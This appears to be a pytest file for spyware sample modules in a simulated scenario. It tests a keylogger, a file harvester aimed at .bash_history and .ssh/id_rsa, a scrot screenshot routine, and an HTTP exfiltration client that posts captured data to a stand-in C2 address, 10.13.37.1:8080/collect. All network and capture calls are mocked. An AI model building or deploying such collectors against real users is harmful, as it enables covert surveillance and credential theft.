"""Unit tests for core/spyware-samples/shared/ modules.

Imports rely on conftest.py inserting shared/ into sys.path.
"""
import os

import pytest


# --- Keylogger -------------------------------------------------------------

def test_collector_module_importable():
    import collector  # noqa: F401


def test_keylogger_has_public_surface():
    from collector import Keylogger

    assert hasattr(Keylogger, "BACKEND_PREFERENCE")
    assert Keylogger.BACKEND_PREFERENCE == ("xlib", "pynput")

    kl = Keylogger(backend="null")
    assert isinstance(kl.buffer, list)
    assert callable(kl.start)
    assert callable(kl.stop)
    assert callable(kl.flush)


def test_keylogger_null_backend_buffer_starts_empty():
    from collector import Keylogger
    kl = Keylogger(backend="null")
    assert kl.buffer == []


def test_keylogger_flush_returns_and_clears_buffer():
    from collector import Keylogger
    kl = Keylogger(backend="null")
    kl.buffer.extend(["a", "b", "c"])
    snapshot = kl.flush()
    assert snapshot == ["a", "b", "c"]
    assert kl.buffer == []


def test_keylogger_null_backend_start_stop_is_noop():
    from collector import Keylogger
    kl = Keylogger(backend="null")
    kl.start()
    kl.stop()
    assert kl.buffer == []


def test_keylogger_auto_falls_back_when_display_unset(monkeypatch):
    """Without DISPLAY both xlib and pynput are unavailable; constructor must pick null."""
    monkeypatch.delenv("DISPLAY", raising=False)
    from collector import Keylogger
    kl = Keylogger()
    assert kl.active_backend == "null"


def test_keylogger_raises_on_unknown_backend():
    from collector import Keylogger
    with pytest.raises(ValueError, match="unknown backend"):
        Keylogger(backend="telepathy")


# --- File harvester --------------------------------------------------------

def test_harvest_files_reads_existing_files(tmp_path):
    from collector import harvest_files

    (tmp_path / ".bash_history").write_text("ls -la\ncat secret.txt\n")
    (tmp_path / "Documents").mkdir()
    (tmp_path / "Documents" / "report-draft.txt").write_text("Q4 draft")

    out = harvest_files(tmp_path, [".bash_history", "Documents/report-draft.txt"])

    assert out[".bash_history"] == "ls -la\ncat secret.txt\n"
    assert out["Documents/report-draft.txt"] == "Q4 draft"


def test_harvest_files_skips_missing_files_without_raising(tmp_path):
    from collector import harvest_files

    (tmp_path / ".bash_history").write_text("x")
    out = harvest_files(tmp_path, [".bash_history", ".ssh/id_rsa", "nonexistent"])

    assert ".bash_history" in out
    assert ".ssh/id_rsa" not in out
    assert "nonexistent" not in out


def test_harvest_files_returns_bytes_for_binary(tmp_path):
    from collector import harvest_files

    binary = bytes(range(256))
    (tmp_path / "blob.bin").write_bytes(binary)

    out = harvest_files(tmp_path, ["blob.bin"], binary=True)

    assert out["blob.bin"] == binary


# --- Screenshot -----------------------------------------------------------

def test_take_screenshot_returns_false_when_scrot_missing(tmp_path, monkeypatch):
    from collector import take_screenshot

    monkeypatch.setattr("shutil.which", lambda name: None)
    out_path = tmp_path / "screen.png"
    ok = take_screenshot(out_path)
    assert ok is False
    assert not out_path.exists()


def test_take_screenshot_invokes_scrot_with_output_path(tmp_path, monkeypatch):
    from collector import take_screenshot

    calls = []

    def fake_which(name):
        return "/usr/bin/scrot" if name == "scrot" else None

    def fake_run(cmd, *a, **kw):
        calls.append(cmd)
        from pathlib import Path as _Path
        _Path(cmd[-1]).write_bytes(b"\x89PNG\r\n\x1a\n")

        class _R:
            returncode = 0
        return _R()

    monkeypatch.setattr("shutil.which", fake_which)
    monkeypatch.setattr("subprocess.run", fake_run)

    out_path = tmp_path / "screen.png"
    ok = take_screenshot(out_path)
    assert ok is True
    assert calls == [["/usr/bin/scrot", "--overwrite", str(out_path)]]
    assert out_path.exists()


# --- HTTP exfil ------------------------------------------------------------

def test_http_exfil_module_importable():
    import exfil_http  # noqa: F401


def test_http_exfil_posts_plaintext_json(monkeypatch):
    import exfil_http

    captured = {}

    def fake_post(url, json=None, timeout=None, **kw):
        captured["url"] = url
        captured["json"] = json
        captured["timeout"] = timeout

        class _R:
            status_code = 200

            def raise_for_status(self):
                pass

        return _R()

    monkeypatch.setattr("requests.post", fake_post)

    client = exfil_http.HttpExfilClient(host="10.13.37.1", port=8080)
    ok = client.send({
        "host": "workstation-042",
        "user": "analyst",
        "keys": ["h", "i"],
        "files": {".bash_history": "ls -la\n"},
    })

    assert ok is True
    assert captured["url"] == "http://10.13.37.1:8080/collect"
    assert captured["json"]["host"] == "workstation-042"
    assert captured["json"]["keys"] == ["h", "i"]
    assert captured["timeout"] == 10


def test_http_exfil_returns_false_on_network_error(monkeypatch):
    import exfil_http
    import requests

    def fake_post(*a, **kw):
        raise requests.ConnectionError("c2 unreachable")

    monkeypatch.setattr("requests.post", fake_post)
    client = exfil_http.HttpExfilClient(host="10.13.37.1", port=8080)
    assert client.send({"ping": 1}) is False


def test_http_exfil_uses_scenario_facts_defaults(monkeypatch):
    """Constructor without args should pull C2_IP and C2_HTTP_PORT from scenario_facts."""
    import exfil_http
    client = exfil_http.HttpExfilClient()
    from generators.data import scenario_facts as sf
    assert client.host == sf.C2_IP
    assert client.port == sf.C2_HTTP_PORT
